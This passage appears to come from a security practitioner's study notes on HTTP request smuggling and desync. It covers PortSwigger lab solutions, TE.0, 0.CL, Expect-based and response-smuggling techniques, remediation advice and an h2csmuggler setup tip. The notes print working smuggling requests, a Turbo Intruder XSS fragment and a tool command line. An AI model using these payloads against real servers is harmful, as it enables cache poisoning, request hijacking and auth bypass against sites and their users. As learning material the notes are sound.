Front-end downgrades HTTP/2 → HTTP/1.1 without sanitising headers. Use CRLF injection in an HTTP/2 header to tunnel a request. Leak internal headers (e.g., `X-SSL-VERIFIED`, `X-SSL-CLIENT-CN`) via a reflected search endpoint by increasing inner Content-Length. Re-issue with `X-SSL-VERIFIED: 1` and `X-SSL-CLIENT-CN: administrator`. Size the request using HEAD to find a path whose response fits within the byte window (e.g., `/?search=hacker` at ~3406 bytes).

#### Lab 19 — Web cache poisoning via HTTP/2 request tunnelling (Expert)
Front-end does not reuse back-end connections — classic smuggling won't work. Use HTTP/2 CRLF tunnelling. Switch from GET to HEAD to make the attack non-blind (HEAD responses include Content-Length for the body). Find a redirect sink that reflects attacker input. Pad the JS payload with ~8800 `A` characters so the Content-Length exceeds the home page. Remove the cache buster to poison `/`.

#### Lab 20 — Client-side desync (Expert)
Server returns 302 without reading the full POST body (CSD vector). Send a POST with oversized Content-Length to confirm. Smuggle a partial POST to a comment endpoint. Use JavaScript `fetch()` with `mode: 'cors'` to trigger a CORS error that prevents redirect-following, leaving the prefix in the socket. The second fetch (same connection) appends to the smuggled prefix, capturing the victim's request in a comment.

#### Lab 21 — Server-side pause-based request smuggling (Expert)
Apache 2.4.52. Redirect endpoint `/resources` → `/resources/`. Use Turbo Intruder with 61-second pause after headers. Smuggle `GET /admin/` with `Host: localhost`. Retrieve CSRF token from admin panel response, then smuggle the full delete POST. See [[#Pause-Based (Server-Side CL.0)]] section for full script.

#### Lab 22 — Server-side CL.0 request smuggling (Expert)
Static resource paths (e.g., `/resources/css/`) cause the back-end to ignore Content-Length. Use Turbo Intruder with James Kettle's `0cl-exploit.py` template. Stage 1 sends the CL.0 prefix via a static path; smuggled payload targets a reflected XSS endpoint (`/post?postId=8`, `User-Agent` reflected). Stage 2 uses OPTIONS to maintain connection state.

```python
# Key Turbo Intruder customisations for CL.0 XSS:
stage1 = 'POST /resources/css/anything HTTP/1.1\r\nHost: ...\r\nContent-Length: %s\r\n\r\n'
smuggled = 'GET /post?postId=8 HTTP/1.1\r\nUser-Agent: a"/><script>alert(1)</script>\r\n...'
stage2_chopped = 'OPTIONS / HTTP/1.1\r\nContent-Length: 123\r\nX: Y'
```

## Modern desync (2024-2025)

The classic CL.TE / TE.CL matrix assumes both servers honour either Content-Length or Transfer-Encoding. The 2024-2025 wave exploits the **implicit-zero** case: one server reads a body where the other reads none (`0`). James Kettle frames the whole class as a single root cause in "HTTP/1.1 Must Die" (2025): HTTP/1.1 request boundaries are ambiguous, and any front-end/back-end parser discrepancy over an upstream HTTP/1.1 hop is exploitable. The fix is structural (HTTP/2 upstream), not a WAF rule.

### TE.0 desync (2024)

Back-end ignores `Transfer-Encoding` entirely and treats the body length as zero, while the front-end honours chunked. Inverse of CL.0. Discovered in the Google Cloud HTTP(S) Load Balancer when it was configured to default to HTTP/1.1 upstream (thousands of GCP-hosted sites affected), bypassing Identity-Aware Proxy (IAP) auth and enabling site-wide redirects. Probe like CL.0 but with an obfuscated/duplicated `Transfer-Encoding` that the back-end discards. Trigger condition: load balancer or proxy that downgrades to HTTP/1.1 toward origin.

### 0.CL desync (implicit-zero to Content-Length)

Front-end treats the request as bodyless (implicit-zero) and starts parsing the next bytes as a new request; back-end honours `Content-Length` and waits for a body. Pure 0.CL **deadlocks** unless an **early-response gadget** answers before the body arrives:

- IIS reserved filenames: `/con`, `/prn`, `/aux`, `/nul`, `/com1`-`/com7` respond immediately.
- nginx static files / server-level redirects that respond before body completion.

**Double-desync** converts 0.CL into CL.0 over two requests, then injects a prefix into the victim request:

```http
POST /nul HTTP/1.1
Content-length: 163

POST / HTTP/1.1
Content-Length: 111
GET / HTTP/1.1
Host: <target>
GET /wrtz HTTP/1.1
Foo: bar
```

### Expect-based desync

The `Expect: 100-continue` header splits sending into two phases (headers, then body after a `100 Continue`). Either side mishandling it desyncs the pipeline, and the header is a clean WAF bypass because filters watch for `Transfer-Encoding`, not `Expect`.

**0.CL via vanilla Expect** (front-end forgets to wait for the body → timeout/deadlock signal):

```http
GET /logout HTTP/1.1
Host: target
Expect: 100-continue
Content-Length: 291

[body]
```

**CL.0 via obfuscated Expect** (back-end answers, prepended GET hits the next victim) — `Expect: y 100-continue` style masking also evades WAFs:

```http
OPTIONS /anything HTTP/1.1
Host: auth.example.com
Expect: 100-continue
Content-Length: 39

GET / HTTP/1.1
Host: attacker.example
X: X
```

Confirmed across Akamai, Netlify, Cloudflare, and others. Can leak back-end-stripped headers in the second header block.

### V-H / H-V parser discrepancies

Generalised model behind the variants above: classify each obfuscated header by whether the **front-end (Visible)** and **back-end (Hidden)** see it.

- **V-H** (visible to front-end, hidden from back-end) → CL.0 / TE.CL by hiding the length header from the back-end.
- **H-V** (hidden from front-end, visible to back-end) → CL.TE, or CL.0 plus an early-response gadget.

Detect by sending a masked header (space before name, duplicate, null/obfuscated value) and diffing status code + which server originated the response. A unique `503`/error on one permutation proves a discrepancy.

### Detection and remediation

- **HTTP Request Smuggler v3** (Burp) probes header-permutation discrepancies, early-response gadgets, and non-compliant parsers (`\n\n` terminators per RFC-9112).
- **Root fix: HTTP/2 (or better) end to end.** HTTP/2 framing has unambiguous lengths. Supported upstream by HAProxy, F5 Big-IP, Google Cloud, Imperva; **not** by nginx, Akamai, CloudFront, Fastly (as of this research). WAF-only defence is insufficient and already bypassed by Expect masking.

Related single-packet primitive used for detection and for [[race-conditions]] / [[web-timing-attacks]].

## HTTP response smuggling / desync primitives
Response smuggling sends TWO complete requests to desync the proxy's RESPONSE queue rather than prefixing the victim's request. The smuggled request must be slow (e.g. hit a sleep endpoint) so the attacker's connection closes before it responds; the victim's response then gets swapped for the attacker's, or the victim's response (with `Set-Cookie`) is delivered to the attacker. One payload can nest many responses to hit many users or DoS.

- **Capture victim requests:** send a final `POST` with a reflected parameter and a large `Content-Length`; the victim's next request appends after your reflected param and comes back to you.
- **HEAD desync:** a `HEAD` response carries the `Content-Length` of the equivalent GET but no body, so the proxy waits for body bytes and fills them with the NEXT queued response. This glues an attacker-chosen body onto a victim's response header, or forces Content-Type/length confusion.
- **TRACE reflection gadget:** when there is no reflection endpoint, smuggle `HEAD` then `TRACE`. TRACE echoes the backend-received request (including proxy-added `X-Forwarded-For` and downgraded start-lines), becoming the HEAD response's missing body = attacker-controlled reflected bytes, yielding XSS/content confusion even on a page with no XSS sink.

```http
GET / HTTP/1.1
Host: target
Content-Length: 150

HEAD / HTTP/1.1
Host: target

TRACE / HTTP/1.1
Host: target
X-Pad: ...padding...
X: <script>alert(1)</script>
```

- **Response splitting** yields a full attacker-crafted response cached in the proxy (arbitrary-URL cache poisoning when the "victim" is the attacker) and web cache deception (cache a victim's private response).
- **2024-2025 discrepancy classes** worth testing even when request-side checks are clean: response TE.CL / dechunk-vs-length mismatches, response-order mapping bugs (response stealing), and CGI/FastCGI/uWSGI gateway header leakage into the final HTTP response.

Modern-testing caveat: if the PoC only works with `requestsPerConnection > 1` or explicit socket reuse, re-test with reuse disabled; you may have only desynced your client, not the front-end from the back-end. Confirm a real parser discrepancy via an HTTP/2 to HTTP/1 downgrade that yields a nested HTTP/1 response. Tool: Burp HTTP Request Smuggler.

## Sources

- THM HTTP Request Smuggling pt1 (`https://tryhackme.com/room/httprequestsmuggling`)
- THM HTTP/2 Request Smuggling pt2 (`https://tryhackme.com/room/http2requestsmuggling`)
- THM WebSocket Smuggling (`https://tryhackme.com/room/wsrequestsmuggling`)
- THM Browser Desync (`https://tryhackme.com/room/httpbrowserdesync`)
- THM Elbandito CTF (`https://tryhackme.com/room/elbandito`)
- `0xdf-hard-insane`: Sink (HaProxy versus Gitea smuggling bridging into LocalStack/AWS mocks)
- PortSwigger Web Security Academy — HTTP Request Smuggling labs (Practitioner + Expert, Labs 1–22) (`git-portswigger-all-labs`)
- James Kettle, PortSwigger Research, "Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling" (slug: portswigger-browser-powered-desync).
- James Kettle, PortSwigger Research, "HTTP/1.1 Must Die: The Desync Endgame" (2025) - 0.CL, expect-based desync, V-H/H-V model, HTTP Request Smuggler v3 (slug: kettle-http1-must-die) (`https://portswigger.net/research/http1-must-die`).
- "Unveiling TE.0 HTTP Request Smuggling: Discovering a Critical Vulnerability in Thousands of Google Cloud Websites", Bugcrowd (2024) (slug: te0-bugcrowd) (`https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/`).
- @flomb, "Playing with HTTP/2 CONNECT" (2025 top-10 #9) - HTTP/2 CONNECT internal port scanning + tunnelling (slug: flomb-http2-connect) (`https://blog.flomb.net/posts/http2connect/`).
- HackTricks (pentesting-web) - response smuggling / desync primitives (slug: hacktricks-web).

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[parser-differentials]]
- [[smuggling]]

## Tool gotcha: h2csmuggler needs an OLD Python — run it in a throwaway docker

`h2csmuggler.py` pins the deprecated `hyper` H2 library (plus `h2`/`requests`), which only installs/runs cleanly on **Python 3.11 or older** — on a modern Kali (3.12/3.13) the deps fail to build or the tool errors at import. Don't fight the system Python; run the tool inside a disposable container pinned to the version it wants:

```bash
# throwaway python 3.11 container, cwd mounted at /app, auto-removed on exit (--rm)
docker run -it --rm -v $(pwd):/app python:3.11 bash
# inside the container:
cd /app
python3.11 -m pip install hyper requests h2
python h2csmuggler.py -x https://target:8200/ https://target:8200/private
```

- The container is deleted the moment you exit / Ctrl-C (that is what `--rm` does) — no cleanup, no host pollution.
- Flaky by nature: **re-run the smuggle a couple of times if it fails** (the H2 upgrade race does not always land).
- **Generic pattern — any tool pinning an old/abandoned dependency** (old python, a specific node, a legacy openssl): reach for a version-matched throwaway container instead of downgrading the host — `docker run -it --rm -v $(pwd):/app python:3.11 bash` (swap `python:3.11` for `python:3.9`, `node:16`, etc.). Cheaper and cleaner than a venv fight or a host downgrade.

<!-- promoted-slug: h2csmuggler-python-version-docker -->
